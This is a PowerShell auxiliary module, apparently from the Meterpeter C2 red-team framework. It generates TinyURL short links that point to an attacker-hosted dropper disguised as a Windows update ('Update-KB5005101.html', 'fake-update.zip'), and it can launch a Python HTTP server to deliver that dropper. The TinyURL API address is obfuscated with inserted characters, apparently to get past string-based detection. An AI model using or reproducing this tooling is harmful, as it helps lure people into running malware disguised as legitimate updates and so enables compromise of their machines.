<#
.SYNOPSIS
   TinyUrl url generator

   Author: @r00t-3xp10it (ssa redteam)
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: none
   Optional Dependencies: http.server {manual}
   PS cmdlet Dev version: v1.0.3

.DESCRIPTION
   Auxiliary module of Meterpeter C2 v2.10.12 that generates
   tinyurl links to deliver droppers (cradles) in local LAN.

.NOTES
   This cmdlet creates tinyurl links to deliver Meterpeter C2
   droppers (cradles) in local LAN, and its automatic executed.
   If invoked -startserver 'true' then cmdlet starts http.server.

.Parameter ServerPort
   Attacker IP : http.server port (default: 192.168.1.72:8087)

.Parameter PayloadName
   Meterpeter C2 dropper name (default: Update-KB5005101.html)

.Parameter StartServer
   Start http.server process? (default: false)

.Parameter Verb
   Use TinyUrl verbose output? (default: false)
  
.EXAMPLE
   PS C:\> .\shorturl.ps1 -ServerPort '127.0.0.1:8080'
   URI: http://127.0.0.1:8080/Update-KB5005101.html

.EXAMPLE
   PS C:\> .\shorturl.ps1 -ServerPort '192.168.1.72:8087' -PayloadName 'update.html'
   URI: http://192.168.1.72:8087/update.html

.EXAMPLE
   PS C:\> .\shorturl.ps1 -PayloadName 'fake-update.zip' -Verb 'true'
   URI: http://192.168.1.72:8087/fake-update.zip ( verbose outputs )

.EXAMPLE
   PS C:\> .\shorturl.ps1 -serverport '127.0.0.1:8081' -startserver 'true'
   URI: http://127.0.0.1:8081/Update-KB5005101.html ( start http.server )

.INPUTS
   None. You cannot pipe objects into shorturl.ps1

.OUTPUTS
   [i] Raw Url       : http://192.168.1.72:8080/Update-KB5005101.html

   StatusCode        : 200
   StatusDescription : OK
   Content           : https://tinyurl.com/yyx9xptu
   RawContent        : HTTP/1.1 200 OK
                       Connection: keep-alive
                       X-Content-Type-Options: nosniff
                       X-XSS-Protection: 1; mode=block
                       CF-Cache-Status: DYNAMIC
                       CF-RAY: 703551185c40da82-LIS
                       alt-svc: h3=":443"; ma=86400, h3-29="...
   Forms             : {}
   Headers           : {[Connection, keep-alive], [X-Content-Type-Options, nosniff], [X-XSS-Protection, 1; mode=block],
                       [CF-Cache-Status, DYNAMIC]...}
   Images            : {}
   InputFields       : {}
   Links             : {}
   ParsedHtml        : mshtml.HTMLDocumentClass
   RawContentLength  : 28

   [i] Shorten Uri  : https://tinyurl.com/yyx9xptu

.LINK
   https://github.com/r00t-3xp10it/meterpeter
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$PayloadName="Update-KB5005101.html",
   [string]$ServerPort="192.168.1.72:8087",
   [string]$StartServer="false",
   [string]$Verb="false"
)


$testServer = $null
#Global variable declarations
$ErrorActionPreference = "SilentlyContinue"

#Shorten Url function
$Uri = "https://$ServerPort/$PayloadName" -replace 'ps:','p:'
$UrlApi = 'https://tin€yu€rl.c€om/api-cr€eat€e.p€hp' -replace 'ps:','p:' -replace '€',''
$Response = Invoke-WebRequest ("{0}?url={1}" -f $UrlApi, $Uri)


If($Response)
{
   If($Verb -ieq "True")
   {
      #Cmdlet verbose display fuction
      write-host "[i] Raw Url       : $Uri" -ForeGroundColor Black -BackGroundColor white
      $Response
   }

   #Store uri in variable and Send tinyurl uri generated to logfile.
   $Response.Content|Out-File -FilePath "$Env:TMP\sHORTENmE.mtp" -Force
   $GetShortenUrl = Get-Content -Path "$Env:TMP\sHORTENmE.mtp"

   #Display onscreen uri
   If($Response.StatusCode -eq 200 -and $GetShortenUrl -ne $null)
   {
      Write-Host "[i] Shorten Uri  : $GetShortenUrl" -ForeGroundColor Black -BackGroundColor white
   }
   Else
   {
      Write-Host "[" -ForeGroundColor DarkGray -NoNewline;
      Write-Host "x" -ForeGroundColor Red -NoNewline;
      Write-Host "] fail to retrieve tinyurl uri .." -ForeGroundColor DarkGray
   }

   If($StartServer -ieq "true")
   {
      Try{
         $testServer = python -V
      }Catch{
         Write-Host "[" -ForeGroundColor DarkGray -NoNewline;
         Write-Host "x" -ForeGroundColor Red -NoNewline;
         Write-Host "] cmdlet cant find python interpreter .." -ForeGroundColor DarkGray      
      }

      If($testServer)
      {
         $HttpAddr = $ServerPort.Split(':')[0];$HttpPort = $ServerPort.Split(':')[1]
         Start-Process powershell -ArgumentList "python -m http.server $HttpPort --bind $HttpAddr"
      }
   }

   #Cleanup function 
   Remove-Item -Path "$Env:TMP\sHORTENmE.mtp" -Force
}
Else
{
   Write-Host "[" -ForeGroundColor DarkGray -NoNewline;
   Write-Host "x" -ForeGroundColor Red -NoNewline;
   Write-Host "] fail to retrieve tinyurl uri .." -ForeGroundColor DarkGray
}
